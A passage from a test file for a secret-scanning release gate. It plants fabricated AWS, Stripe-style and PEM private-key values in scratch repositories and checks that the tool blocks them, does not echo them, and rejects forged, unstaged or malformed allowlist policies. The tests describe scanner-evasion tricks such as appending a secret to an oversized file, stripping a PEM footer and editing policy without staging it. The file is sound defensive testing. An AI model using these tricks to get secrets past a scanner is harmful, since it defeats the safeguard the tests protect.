    // 5 MB filler + the secret appended at the very end — the classic silent miss
    // if a naive scanner skips or truncates oversized files.
    write(repo, "package.json", JSON.stringify({ name: "big-file-repo", version: "1.0.0", private: true }, null, 2) + "\n");
    write(repo, "big-log.txt", "x".repeat(5 * 1024 * 1024) + `\nAWS_KEY=${awsKey}\n`);
    commitAll(repo, "chore: oversized file with trailing secret");

    const r = run(["check", "--json"], repo);
    assert.equal(r.code, 1, "a secret in the tail of an oversized file must NO-GO");
    const doc = parseJson(r);
    assert.equal(doc.verdict, "NO-GO");
    const secret = doc.checks.find((c) => c.label === "Secret scan");
    assert.ok(secret && secret.status === "fail", JSON.stringify(doc.checks, null, 2));
    assert.ok(secret.extra.join("\n").includes("big-log.txt"), "the oversized file must be named as the hit");
    assert.ok(secret.extra.join("\n").includes("AWS access key id"));
    assert.ok(
      /oversized files? >2 MB scanned partially/.test(secret.extra.join("\n")) &&
        secret.extra.join("\n").includes("big-log.txt"),
      "the partial-scan note must disclose it scanned partially AND name the file",
    );
    assert.ok(!JSON.stringify(doc).includes(awsKey), "the full secret must never be echoed");
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 9e. allowlist (0.8.2/0.8.3) — built-in AWS EXAMPLE + tracked policy escape hatch
// ---------------------------------------------------------------------------
scenario("allowlist: AWS EXAMPLE key is built-in allowlisted (GO, disclosed); real AKIA still NO-GO", () => {
  const base = freshBase();
  try {
    // Built-in: AWS docs key ending in EXAMPLE must not hard-block.
    const repo = path.join(base, "docs-example");
    initRepo(repo);
    // Assembled so the test source itself doesn't hard-code the full EXAMPLE
    // string in a way that confuses human readers; the runtime value is the
    // public AWS documentation sample.
    const awsExample = "AKIA" + "IOSFODNN7" + "EXAMPLE";
    write(repo, "package.json", JSON.stringify({ name: "docs-example", version: "1.0.0", private: true }, null, 2) + "\n");
    write(repo, "ROADMAP.md", `AWS docs sample access key id: ${awsExample}\n`);
    commitAll(repo, "docs: AWS EXAMPLE key in markdown");

    const r = run(["check", "--json"], repo);
    assert.equal(r.code, 0, `EXAMPLE key must not NO-GO\n${r.stderr}\n${r.stdout}`);
    const doc = parseJson(r);
    assert.equal(doc.verdict, "GO");
    const secret = doc.checks.find((c) => c.label === "Secret scan");
    assert.equal(secret.status, "pass", JSON.stringify(secret));
    const extra = (secret.extra || []).join("\n");
    assert.ok(/allowlisted/i.test(secret.detail + "\n" + extra), "must disclose the allowlisted hit");
    assert.ok(extra.includes("ROADMAP.md"), "must name the file");
    assert.ok(/built-in/i.test(extra), "reason must cite built-in");
    assert.ok(!JSON.stringify(doc).includes(awsExample), "full value must never be echoed");

    // Real-looking AKIA (not EXAMPLE) still blocks.
    const bad = path.join(base, "real-akia");
    initRepo(bad);
    const realAkia = "AKIA" + "0".repeat(16);
    write(bad, "package.json", JSON.stringify({ name: "real-akia", version: "1.0.0", private: true }, null, 2) + "\n");
    write(bad, "config.js", `export const KEY = "${realAkia}";\n`);
    commitAll(bad, "chore: real-looking AKIA");
    const rb = run(["check", "--json"], bad);
    assert.equal(rb.code, 1, "non-EXAMPLE AKIA must NO-GO");
    const bdoc = parseJson(rb);
    assert.equal(bdoc.verdict, "NO-GO");
    const bsec = bdoc.checks.find((c) => c.label === "Secret scan");
    assert.equal(bsec.status, "fail");
    assert.ok(bsec.extra.join("\n").includes("AWS access key id"));
    assert.ok(!JSON.stringify(bdoc).includes(realAkia), "full secret must never be echoed");
  } finally {
    cleanup(base);
  }
});

scenario("allowlist: .getadvantage/config.json value + path + hash rules; real key not listed still fails", () => {
  const base = freshBase();
  try {
    // --- value allowlist ---
    const repo = path.join(base, "value-ignore");
    initRepo(repo);
    // Stripe-shaped fixture key the user has knowingly baselined.
    const fixtureKey = "sk_live_" + "a1b2c3d4e5f6g7h8i9j0k1l2m3";
    write(repo, "package.json", JSON.stringify({ name: "value-ignore", version: "1.0.0", private: true }, null, 2) + "\n");
    write(repo, "fixtures/sample.js", `export const KEY = "${fixtureKey}";\n`);
    write(
      repo,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        {
          version: 1,
          secrets: {
            ignore: {
              values: [fixtureKey],
            },
          },
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(repo, "chore: fixture key + value allowlist");

    const r = run(["check", "--json"], repo);
    assert.equal(r.code, 0, `value allowlist must GO\n${r.stderr}\n${r.stdout}`);
    const doc = parseJson(r);
    assert.equal(doc.verdict, "GO");
    const secret = doc.checks.find((c) => c.label === "Secret scan");
    assert.equal(secret.status, "pass", JSON.stringify(secret));
    const extra = (secret.extra || []).join("\n");
    assert.ok(/allowlisted/i.test(secret.detail + "\n" + extra));
    assert.ok(/policy: value/i.test(extra), extra);
    assert.ok(!JSON.stringify(doc).includes(fixtureKey), "full value must never be echoed");

    // --- path allowlist ---
    const pathRepo = path.join(base, "path-ignore");
    initRepo(pathRepo);
    const pathKey = "sk_live_" + "z9y8x7w6v5u4t3s2r1q0p9o8n7";
    write(pathRepo, "package.json", JSON.stringify({ name: "path-ignore", version: "1.0.0", private: true }, null, 2) + "\n");
    write(pathRepo, "docs/examples.md", `Example key: ${pathKey}\n`);
    write(
      pathRepo,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        {
          version: 1,
          secrets: { ignore: { paths: ["docs/**"] } },
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(pathRepo, "chore: docs path allowlist");
    const rp = run(["check", "--json"], pathRepo);
    assert.equal(rp.code, 0, `path allowlist must GO\n${rp.stderr}`);
    const pdoc = parseJson(rp);
    assert.equal(pdoc.verdict, "GO");
    const psec = pdoc.checks.find((c) => c.label === "Secret scan");
    assert.equal(psec.status, "pass");
    assert.ok(/policy: path/i.test((psec.extra || []).join("\n")));

    // --- hash allowlist (sha256 auth id from a prior gate report) ---
    const hashRepo = path.join(base, "hash-ignore");
    initRepo(hashRepo);
    const hashKey = "sk_live_" + "f1f2f3f4f5f6f7f8f9f0a1b2c3";
    const auth = hashOf(hashKey);
    write(hashRepo, "package.json", JSON.stringify({ name: "hash-ignore", version: "1.0.0", private: true }, null, 2) + "\n");
    write(hashRepo, "lib/keys.js", `export const K = "${hashKey}";\n`);
    write(
      hashRepo,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        {
          version: 1,
          secrets: { ignore: { hashes: [auth] } },
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(hashRepo, "chore: hash allowlist");
    const rf = run(["check", "--json"], hashRepo);
    assert.equal(rf.code, 0, `hash allowlist must GO\n${rf.stderr}\n${rf.stdout}`);
    const fdoc = parseJson(rf);
    assert.equal(fdoc.verdict, "GO");
    const fsec = fdoc.checks.find((c) => c.label === "Secret scan");
    assert.equal(fsec.status, "pass");
    assert.ok(/policy: hash/i.test((fsec.extra || []).join("\n")));

    // --- still-live key outside allowlist must fail ---
    const live = path.join(base, "still-live");
    initRepo(live);
    const liveKey = "sk_live_" + "9".repeat(26);
    write(live, "package.json", JSON.stringify({ name: "still-live", version: "1.0.0", private: true }, null, 2) + "\n");
    write(live, "src/app.js", `const k = "${liveKey}";\n`);
    write(
      live,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        {
          version: 1,
          secrets: { ignore: { paths: ["docs/**"], values: [fixtureKey] } },
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(live, "chore: live key not allowlisted");
    const rl = run(["check", "--json"], live);
    assert.equal(rl.code, 1, "unallowlisted live key must NO-GO");
    const ldoc = parseJson(rl);
    assert.equal(ldoc.verdict, "NO-GO");
    const lsec = ldoc.checks.find((c) => c.label === "Secret scan");
    assert.equal(lsec.status, "fail");
    assert.ok(lsec.extra.join("\n").includes("src/app.js"));
  } finally {
    cleanup(base);
  }
});

// ---------------------------------------------------------------------------
// 9f. policy safety (0.8.3) — hostile regressions for false-GO paths
// ---------------------------------------------------------------------------
scenario("policy safety: untracked and gitignored policy cannot authorize ignores (NO-GO + warning)", () => {
  const base = freshBase();
  try {
    const fixtureKey = "sk_live_" + "u1n2t3r4a5c6k7e8d9f0a1b2c3";

    // --- untracked policy under own-artifact dirty-tree exception ---
    const untracked = path.join(base, "untracked-policy");
    initRepo(untracked);
    write(untracked, "package.json", JSON.stringify({ name: "untracked-policy", version: "1.0.0", private: true }, null, 2) + "\n");
    write(untracked, "app.js", `export const KEY = "${fixtureKey}";\n`);
    commitAll(untracked, "chore: committed secret, no policy yet");
    // Write policy AFTER commit so it stays untracked. Dirty-tree treats
    // .getadvantage/* as own-artifact, so GO would be false if policy applied.
    write(
      untracked,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        { version: 1, secrets: { ignore: { values: [fixtureKey] } } },
        null,
        2,
      ) + "\n",
    );
    const ru = run(["check", "--json"], untracked);
    assert.equal(ru.code, 1, `untracked policy must not authorize GO\n${ru.stderr}\n${ru.stdout}`);
    const udoc = parseJson(ru);
    assert.equal(udoc.verdict, "NO-GO");
    const usec = udoc.checks.find((c) => c.label === "Secret scan");
    assert.equal(usec.status, "fail");
    const uextra = (usec.extra || []).join("\n");
    assert.ok(/not tracked or staged/i.test(uextra), uextra);
    assert.ok(!/policy: value/i.test(uextra), "must not claim policy:value allowlist");

    // Staged policy is in the index → secret-scan ignore rules apply from the
    // index blob. config.json is ship-risk (not regenerated churn), so dirty-tree
    // still NO-GOs until the policy is committed.
    g(["add", path.join(".getadvantage", "config.json")], untracked);
    const rs = run(["check", "--json"], untracked);
    assert.equal(rs.code, 1, `staged-but-uncommitted policy must dirty-tree NO-GO\n${rs.stderr}\n${rs.stdout}`);
    const sdoc = parseJson(rs);
    assert.equal(sdoc.verdict, "NO-GO");
    const ssec = sdoc.checks.find((c) => c.label === "Secret scan");
    assert.equal(ssec.status, "pass", "index-backed staged policy must authorize the secret");
    assert.ok(/policy: value/i.test((ssec.extra || []).join("\n")));
    const sdirty = sdoc.checks.find((c) => c.label === "Dirty-tree guard");
    assert.equal(sdirty.status, "fail", "config.json staged edit is ship-risk, not marker churn");

    // After commit, policy authorizes and the tree is clean of ship-risk → GO.
    commitAll(untracked, "chore: commit policy allowlist");
    const rc = run(["check", "--json"], untracked);
    assert.equal(rc.code, 0, `committed policy must authorize GO\n${rc.stderr}\n${rc.stdout}`);
    assert.equal(parseJson(rc).verdict, "GO");

    // --- gitignored policy: exists on disk but not in index ---
    const ignored = path.join(base, "ignored-policy");
    initRepo(ignored);
    write(ignored, "package.json", JSON.stringify({ name: "ignored-policy", version: "1.0.0", private: true }, null, 2) + "\n");
    write(ignored, "app.js", `export const KEY = "${fixtureKey}";\n`);
    write(ignored, ".gitignore", ".getadvantage/\n");
    commitAll(ignored, "chore: secret + ignore marker dir");
    write(
      ignored,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        { version: 1, secrets: { ignore: { values: [fixtureKey] } } },
        null,
        2,
      ) + "\n",
    );
    const ri = run(["check", "--json"], ignored);
    assert.equal(ri.code, 1, `gitignored policy must not authorize GO\n${ri.stderr}\n${ri.stdout}`);
    const idoc = parseJson(ri);
    assert.equal(idoc.verdict, "NO-GO");
    const isec = idoc.checks.find((c) => c.label === "Secret scan");
    assert.equal(isec.status, "fail");
    assert.ok(/not tracked or staged/i.test((isec.extra || []).join("\n")));
  } finally {
    cleanup(base);
  }
});

scenario("policy safety: display fingerprint is not an auth id; hash collisions isolated; patternIds; versions; precedence", () => {
  const base = freshBase();
  try {
    // Craft two distinct keys with identical display fingerprint (prefix, last4, len).
    const key1 = "sk_live_" + "11111111111111111111" + "zzzz";
    const key2 = "sk_live_" + "22222222222222222222" + "zzzz";
    assert.equal(displayFp(key1), displayFp(key2), "fixture keys must collide on display fp");
    assert.notEqual(hashOf(key1), hashOf(key2), "auth ids must differ");

    // --- display fingerprint in policy must NOT authorize ---
    const disp = path.join(base, "display-fp");
    initRepo(disp);
    write(disp, "package.json", JSON.stringify({ name: "display-fp", version: "1.0.0", private: true }, null, 2) + "\n");
    write(disp, "a.js", `export const A = "${key1}";\n`);
    write(
      disp,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        {
          version: 1,
          secrets: { ignore: { fingerprints: [displayFp(key1)] } },
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(disp, "chore: display fingerprint in policy (must not authorize)");
    const rd = run(["check", "--json"], disp);
    assert.equal(rd.code, 1, `display fingerprint must not authorize\n${rd.stderr}\n${rd.stdout}`);
    const ddoc = parseJson(rd);
    assert.equal(ddoc.verdict, "NO-GO");
    const dsec = ddoc.checks.find((c) => c.label === "Secret scan");
    assert.equal(dsec.status, "fail");
    const dextra = (dsec.extra || []).join("\n");
    assert.ok(/display fingerprint|auth id|hashes/i.test(dextra), dextra);

    // --- auth hash for key1 must allow key1 only, not display-colliding key2 ---
    const coll = path.join(base, "hash-collision");
    initRepo(coll);
    write(coll, "package.json", JSON.stringify({ name: "hash-collision", version: "1.0.0", private: true }, null, 2) + "\n");
    write(coll, "one.js", `export const A = "${key1}";\n`);
    write(coll, "two.js", `export const B = "${key2}";\n`);
    write(
      coll,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        {
          version: 1,
          secrets: { ignore: { hashes: [hashOf(key1)] } },
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(coll, "chore: hash allowlists only key1");
    const rc = run(["check", "--json"], coll);
    assert.equal(rc.code, 1, `key2 must still NO-GO despite display collision\n${rc.stderr}\n${rc.stdout}`);
    const cdoc = parseJson(rc);
    assert.equal(cdoc.verdict, "NO-GO");
    const csec = cdoc.checks.find((c) => c.label === "Secret scan");
    assert.equal(csec.status, "fail");
    const cextra = (csec.extra || []).join("\n");
    assert.ok(cextra.includes("two.js"), "key2 file must be listed as a hit");
    assert.ok(/allowlisted/i.test(csec.detail + "\n" + cextra), "key1 should be disclosed as allowlisted");
    assert.ok(/policy: hash/i.test(cextra));
    assert.ok(!JSON.stringify(cdoc).includes(key1) && !JSON.stringify(cdoc).includes(key2));

    // --- patternIds allowlist (id: stripe-live) ---
    const pat = path.join(base, "pattern-ids");
    initRepo(pat);
    const stripeKey = "sk_live_" + "p1a2t3t4e5r6n7i8d9s0x1y2z3";
    write(pat, "package.json", JSON.stringify({ name: "pattern-ids", version: "1.0.0", private: true }, null, 2) + "\n");
    write(pat, "token.js", `export const T = "${stripeKey}";\n`);
    write(
      pat,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        {
          version: 1,
          secrets: { ignore: { patternIds: ["stripe-live"] } },
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(pat, "chore: patternIds allowlist");
    const rp = run(["check", "--json"], pat);
    assert.equal(rp.code, 0, `patternIds must GO\n${rp.stderr}\n${rp.stdout}`);
    const pdoc = parseJson(rp);
    assert.equal(pdoc.verdict, "GO");
    const psec = pdoc.checks.find((c) => c.label === "Secret scan");
    assert.equal(psec.status, "pass");
    assert.ok(/policy: patternId/i.test((psec.extra || []).join("\n")));

    // patternIds must not blanket-allow unrelated pattern families
    write(pat, "aws.js", `export const A = "AKIA${"0".repeat(16)}";\n`);
    write(
      pat,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        {
          version: 1,
          secrets: { ignore: { patternIds: ["stripe-live"] } },
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(pat, "chore: aws key not covered by stripe patternId");
    const ra = run(["check", "--json"], pat);
    assert.equal(ra.code, 1, "patternIds must not allow other pattern families");
    assert.equal(parseJson(ra).verdict, "NO-GO");

    // --- malformed JSON ---
    const mal = path.join(base, "malformed");
    initRepo(mal);
    write(mal, "package.json", JSON.stringify({ name: "malformed", version: "1.0.0", private: true }, null, 2) + "\n");
    write(mal, "app.js", `export const KEY = "${stripeKey}";\n`);
    write(mal, path.join(".getadvantage", "config.json"), "{ not valid json\n");
    commitAll(mal, "chore: malformed policy");
    const rm = run(["check", "--json"], mal);
    assert.equal(rm.code, 1, "malformed policy must not authorize");
    const mdoc = parseJson(rm);
    assert.equal(mdoc.verdict, "NO-GO");
    const msec = mdoc.checks.find((c) => c.label === "Secret scan");
    assert.ok(/could not be parsed|not applied/i.test((msec.extra || []).join("\n")));

    // --- unsupported version ---
    const ver = path.join(base, "bad-version");
    initRepo(ver);
    write(ver, "package.json", JSON.stringify({ name: "bad-version", version: "1.0.0", private: true }, null, 2) + "\n");
    write(ver, "app.js", `export const KEY = "${stripeKey}";\n`);
    write(
      ver,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        { version: 99, secrets: { ignore: { values: [stripeKey] } } },
        null,
        2,
      ) + "\n",
    );
    commitAll(ver, "chore: unsupported policy version");
    const rv = run(["check", "--json"], ver);
    assert.equal(rv.code, 1, "unsupported version must not authorize");
    const vdoc = parseJson(rv);
    assert.equal(vdoc.verdict, "NO-GO");
    const vsec = vdoc.checks.find((c) => c.label === "Secret scan");
    assert.ok(/unsupported version/i.test((vsec.extra || []).join("\n")));

    // --- current .getadvantage wins over legacy .ship-safe when both exist ---
    const prec = path.join(base, "precedence");
    initRepo(prec);
    const precKey = "sk_live_" + "c1u2r3r4e5n6t7w8i9n0s1x2y3";
    write(prec, "package.json", JSON.stringify({ name: "precedence", version: "1.0.0", private: true }, null, 2) + "\n");
    write(prec, "app.js", `export const KEY = "${precKey}";\n`);
    // Legacy would allow the key; current only allowlists docs/** → must NOT allow.
    write(
      prec,
      path.join(".ship-safe", "config.json"),
      JSON.stringify(
        { version: 1, secrets: { ignore: { values: [precKey] } } },
        null,
        2,
      ) + "\n",
    );
    write(
      prec,
      path.join(".getadvantage", "config.json"),
      JSON.stringify({ version: 1, secrets: { ignore: { paths: ["docs/**"] } } }, null, 2) + "\n",
    );
    commitAll(prec, "chore: current wins over legacy");
    const rpr = run(["check", "--json"], prec);
    assert.equal(rpr.code, 1, "current policy must take precedence (no value allow)");
    assert.equal(parseJson(rpr).verdict, "NO-GO");

    // Legacy alone still works when current is absent.
    const leg = path.join(base, "legacy-only");
    initRepo(leg);
    write(leg, "package.json", JSON.stringify({ name: "legacy-only", version: "1.0.0", private: true }, null, 2) + "\n");
    write(leg, "app.js", `export const KEY = "${precKey}";\n`);
    write(
      leg,
      path.join(".ship-safe", "config.json"),
      JSON.stringify(
        { version: 1, secrets: { ignore: { values: [precKey] } } },
        null,
        2,
      ) + "\n",
    );
    commitAll(leg, "chore: legacy-only policy");
    const rl = run(["check", "--json"], leg);
    assert.equal(rl.code, 0, `legacy-only tracked policy must authorize\n${rl.stderr}\n${rl.stdout}`);
    const ldoc = parseJson(rl);
    assert.equal(ldoc.verdict, "GO");
    assert.ok(/policy: value/i.test((ldoc.checks.find((c) => c.label === "Secret scan").extra || []).join("\n")));
  } finally {
    cleanup(base);
  }
});

scenario("policy safety: tracked-then-modified and staged-then-modified policy cannot authorize unstaged ignores", () => {
  const base = freshBase();
  try {
    const fixtureKey = "sk_live_" + "t1r2a3c4k5e6d7m8o9d0i1f2y3";
    const benignPolicy =
      JSON.stringify({ version: 1, secrets: { ignore: { paths: ["docs/**"] } } }, null, 2) + "\n";
    const hostilePolicy =
      JSON.stringify({ version: 1, secrets: { ignore: { values: [fixtureKey] } } }, null, 2) + "\n";

    // --- tracked + committed benign policy, then unstaged worktree value allowlist ---
    const tracked = path.join(base, "tracked-then-modified");
    initRepo(tracked);
    write(tracked, "package.json", JSON.stringify({ name: "tracked-then-mod", version: "1.0.0", private: true }, null, 2) + "\n");
    write(tracked, "app.js", `export const KEY = "${fixtureKey}";\n`);
    write(tracked, path.join(".getadvantage", "config.json"), benignPolicy);
    commitAll(tracked, "chore: secret + benign tracked policy");
    // Baseline: committed secret + path-only policy → NO-GO
    const r0 = run(["check", "--json"], tracked);
    assert.equal(r0.code, 1, "benign tracked policy must not allow the secret");
    assert.equal(parseJson(r0).verdict, "NO-GO");

    // Hostile: overwrite worktree only (no git add) with a value allowlist.
    write(tracked, path.join(".getadvantage", "config.json"), hostilePolicy);
    const r1 = run(["check", "--json"], tracked);
    assert.equal(
      r1.code,
      1,
      `tracked-then-modified unstaged value ignore must not GO\n${r1.stderr}\n${r1.stdout}`,
    );
    const d1 = parseJson(r1);
    assert.equal(d1.verdict, "NO-GO");
    const sec1 = d1.checks.find((c) => c.label === "Secret scan");
    assert.equal(sec1.status, "fail", "unstaged worktree ignore must not authorize");
    const extra1 = (sec1.extra || []).join("\n");
    assert.ok(!/policy: value/i.test(extra1), "must not claim policy:value from unstaged edit");
    assert.ok(
      /working tree differs|git index/i.test(extra1) || sec1.status === "fail",
      extra1,
    );
    const dirty1 = d1.checks.find((c) => c.label === "Dirty-tree guard");
    assert.equal(
      dirty1.status,
      "fail",
      "modified tracked config.json must be ship-risk, not regenerated marker churn",
    );
    assert.ok(
      /config\.json/i.test((dirty1.detail || "") + "\n" + (dirty1.extra || []).join("\n")),
      dirty1.detail,
    );

    // --- staged benign policy, then further unstaged hostile worktree edit ---
    const staged = path.join(base, "staged-then-modified");
    initRepo(staged);
    write(staged, "package.json", JSON.stringify({ name: "staged-then-mod", version: "1.0.0", private: true }, null, 2) + "\n");
    write(staged, "app.js", `export const KEY = "${fixtureKey}";\n`);
    commitAll(staged, "chore: committed secret only");
    write(staged, path.join(".getadvantage", "config.json"), benignPolicy);
    g(["add", path.join(".getadvantage", "config.json")], staged);
    // Index has benign paths-only; overwrite worktree with value allowlist without re-staging.
    write(staged, path.join(".getadvantage", "config.json"), hostilePolicy);
    const r2 = run(["check", "--json"], staged);
    assert.equal(
      r2.code,
      1,
      `staged-then-modified unstaged value ignore must not GO\n${r2.stderr}\n${r2.stdout}`,
    );
    const d2 = parseJson(r2);
    assert.equal(d2.verdict, "NO-GO");
    const sec2 = d2.checks.find((c) => c.label === "Secret scan");
    assert.equal(sec2.status, "fail", "index still paths-only; unstaged values must not authorize");
    const extra2 = (sec2.extra || []).join("\n");
    assert.ok(!/policy: value/i.test(extra2), "must not claim policy:value from unstaged edit");
    assert.ok(/working tree differs|git index/i.test(extra2), extra2);
    const dirty2 = d2.checks.find((c) => c.label === "Dirty-tree guard");
    assert.equal(dirty2.status, "fail", "staged/modified config.json is ship-risk");
  } finally {
    cleanup(base);
  }
});

scenario("policy safety: two distinct PEM private keys — hash of one must not authorize the other", () => {
  const base = freshBase();
  try {
    // Distinct bodies under the same PEM header type. Header-only detectors
    // would hash both to the same auth id and let a copied hash false-GO.
    const pem1 =
      "-----BEGIN RSA PRIVATE KEY-----\n" +
      "MIIEowIBAAKCAQEA1111111111111111111111111111111111111111111111111\n" +
      "AAAA1111KEYONE1111AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n" +
      "-----END RSA PRIVATE KEY-----";
    const pem2 =
      "-----BEGIN RSA PRIVATE KEY-----\n" +
      "MIIEowIBAAKCAQEA2222222222222222222222222222222222222222222222222\n" +
      "BBBB2222KEYTWO2222BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\n" +
      "-----END RSA PRIVATE KEY-----";
    assert.notEqual(hashOf(pem1), hashOf(pem2), "fixture PEMs must have distinct auth ids");
    // Header alone (the pre-fix detector match) collides — prove the fixtures
    // would have been unsafe under header-only hashing.
    const headerOnly = "-----BEGIN RSA PRIVATE KEY-----";
    assert.equal(hashOf(headerOnly), hashOf(headerOnly));

    const repo = path.join(base, "pem-hash-isolation");
    initRepo(repo);
    write(repo, "package.json", JSON.stringify({ name: "pem-hash-isolation", version: "1.0.0", private: true }, null, 2) + "\n");
    write(repo, "keys/one.pem", pem1 + "\n");
    write(repo, "keys/two.pem", pem2 + "\n");
    write(
      repo,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        {
          version: 1,
          secrets: { ignore: { hashes: [hashOf(pem1)] } },
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(repo, "chore: two PEMs; allowlist hash of pem1 only");

    const r = run(["check", "--json"], repo);
    assert.equal(r.code, 1, `pem2 must still NO-GO when only pem1 hash is allowlisted\n${r.stderr}\n${r.stdout}`);
    const doc = parseJson(r);
    assert.equal(doc.verdict, "NO-GO");
    const secret = doc.checks.find((c) => c.label === "Secret scan");
    assert.equal(secret.status, "fail");
    const extra = (secret.extra || []).join("\n");
    assert.ok(extra.includes("two.pem") || /Private key block/.test(extra), `pem2 must be a blocking hit\n${extra}`);
    assert.ok(/allowlisted/i.test(secret.detail + "\n" + extra), "pem1 should be disclosed as allowlisted");
    assert.ok(/policy: hash/i.test(extra), extra);
    // Full PEM bodies must never appear in the report.
    assert.ok(!JSON.stringify(doc).includes("KEYONE"), "pem1 body must not be echoed");
    assert.ok(!JSON.stringify(doc).includes("KEYTWO"), "pem2 body must not be echoed");

    // value allowlist of pem1 must not allow pem2 either
    const valRepo = path.join(base, "pem-value-isolation");
    initRepo(valRepo);
    write(valRepo, "package.json", JSON.stringify({ name: "pem-value-isolation", version: "1.0.0", private: true }, null, 2) + "\n");
    write(valRepo, "keys/one.pem", pem1 + "\n");
    write(valRepo, "keys/two.pem", pem2 + "\n");
    write(
      valRepo,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        {
          version: 1,
          secrets: { ignore: { values: [pem1] } },
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(valRepo, "chore: value-allowlist pem1 only");
    const rv = run(["check", "--json"], valRepo);
    assert.equal(rv.code, 1, "value allowlist of pem1 must not authorize pem2");
    assert.equal(parseJson(rv).verdict, "NO-GO");

    // patternId private-key is explicit and honest (blanket for that family)
    const patRepo = path.join(base, "pem-patternid");
    initRepo(patRepo);
    write(patRepo, "package.json", JSON.stringify({ name: "pem-patternid", version: "1.0.0", private: true }, null, 2) + "\n");
    write(patRepo, "keys/one.pem", pem1 + "\n");
    write(
      patRepo,
      path.join(".getadvantage", "config.json"),
      JSON.stringify(
        {
          version: 1,
          secrets: { ignore: { patternIds: ["private-key"] } },
        },
        null,
        2,
      ) + "\n",
    );
    commitAll(patRepo, "chore: patternId private-key allowlist");
    const rp = run(["check", "--json"], patRepo);
    assert.equal(rp.code, 0, `patternId private-key must GO when intentional\n${rp.stderr}\n${rp.stdout}`);
    const pdoc = parseJson(rp);
    assert.equal(pdoc.verdict, "GO");
    assert.ok(/policy: patternId/i.test((pdoc.checks.find((c) => c.label === "Secret scan").extra || []).join("\n")));
  } finally {
    cleanup(base);
  }
});

scenario("policy safety: incomplete/truncated PEM (no END) stays NO-GO; header hash never allowlists", () => {
  const base = freshBase();
  try {
    // Truncated forms: BEGIN + body, footer removed. Full-block-only detectors
    // would miss these and turn a removed footer into a false GO.
    const truncated = {
      rsa:
        "-----BEGIN RSA PRIVATE KEY-----\n" +
        "MIIEowIBAAKCAQEA1111TRUNCATEDRSA11111111111111111111111111111111\n" +
        "AAAA1111TRUNC1AAAA\n",
      ec:
        "-----BEGIN EC PRIVATE KEY-----\n" +
        "MHcCAQEEIIec1111TRUNCATEDEC11111111111111111111111111111111111\n",
      openssh:
        "-----BEGIN OPENSSH PRIVATE KEY-----\n" +
        "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n" +
        "QyNTUxOQAAACB1111TRUNCATEDOPENSSH1111111111111111111111111111\n",
      generic:
        "-----BEGIN PRIVATE KEY-----\n" +
        "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC1111TRUNCATED\n" +
        "GENERIC11111111111111111111111111111111111111111111111111111111\n",
    };

    // --- each truncated form alone must NO-GO ---
    for (const [name, body] of Object.entries(truncated)) {
      const repo = path.join(base, `trunc-${name}`);
      initRepo(repo);
      write(repo, "package.json", JSON.stringify({ name: `trunc-${name}`, version: "1.0.0", private: true }, null, 2) + "\n");
      write(repo, `keys/${name}.pem`, body);
      commitAll(repo, `chore: truncated ${name} PEM without END`);
      const r = run(["check", "--json"], repo);
      assert.equal(r.code, 1, `truncated ${name} PEM must NO-GO\n${r.stderr}\n${r.stdout}`);
      const doc = parseJson(r);
      assert.equal(doc.verdict, "NO-GO", name);
      const secret = doc.checks.find((c) => c.label === "Secret scan");
      assert.equal(secret.status, "fail", name);
      const extra = (secret.extra || []).join("\n");
      assert.ok(
        /Incomplete private key block|Private key block/i.test(extra),
        `truncated ${name} must be labeled as incomplete/private-key hit\n${extra}`,
      );
      assert.ok(extra.includes(`${name}.pem`) || /private key/i.test(extra), extra);
      // Full body material must never be echoed.
      assert.ok(!JSON.stringify(doc).includes("TRUNCATED"), `body must not be echoed (${name})`);
    }

    // --- removed footer on a previously complete key must stay NO-GO ---
    const stripRepo = path.join(base, "footer-stripped");
    initRepo(stripRepo);
    const complete =
      "-----BEGIN RSA PRIVATE KEY-----\n" +
      "MIIEowIBAAKCAQEA9999COMPLETE99999999999999999999999999999999999\n" +
      "CCCC9999COMPLETE9999CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\n" +
      "-----END RSA PRIVATE KEY-----\n";
    const stripped =
      "-----BEGIN RSA PRIVATE KEY-----\n" +
      "MIIEowIBAAKCAQEA9999COMPLETE99999999999999999999999999999999999\n" +
      "CCCC9999COMPLETE9999CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\n";
    write(stripRepo, "package.json", JSON.stringify({ name: "footer-stripped", version: "1.0.0", private: true }, null, 2) + "\n");
    write(stripRepo, "keys/live.pem", complete);
    commitAll(stripRepo, "chore: complete PEM");
    const rFull = run(["check", "--json"], stripRepo);
    assert.equal(rFull.code, 1, "complete PEM must NO-GO");
    // Strip footer in a new commit (simulates attacker deleting END to evade full-block regex).
    write(stripRepo, "keys/live.pem", stripped);
    commitAll(stripRepo, "chore: strip PEM footer");
    const rStrip = run(["check", "--json"], stripRepo);
    assert.equal(
      rStrip.code,
      1,
      `removing PEM footer must not turn NO-GO into GO\n${rStrip.stderr}\n${rStrip.stdout}`,
    );
